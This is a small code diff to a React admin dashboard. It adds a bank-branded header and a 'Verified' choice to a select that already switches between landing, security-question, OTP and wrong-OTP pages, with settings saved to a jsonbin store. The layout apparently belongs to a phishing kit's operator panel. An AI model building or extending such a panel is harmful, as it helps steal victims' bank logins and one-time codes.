@@ -1,5 +1,6 @@
 import { useState } from "react";
 import { updateSettings } from "../pages/jsonbin";
+import BankHeader from "../components/bankhead";
 
 export default function Admin() {
   const [activePage, setActivePage] = useState("landing");
@@ -26,6 +27,7 @@ export default function Admin() {
 
   return (
     <>
+    <BankHeader/>
       <div className="max-w-2xl mx-auto mt-20">
         <h1 className="text-4xl font-bold mb-10">
           Admin Dashboard
@@ -44,6 +46,8 @@ export default function Admin() {
           <option value="security">Security Question</option>
           <option value="otp">OTP</option>
           <option value="otp2">Wrong Otp</option>
+
+          <option value="verified">Verified</option>
         </select>
 
         <label className="block mt-8">
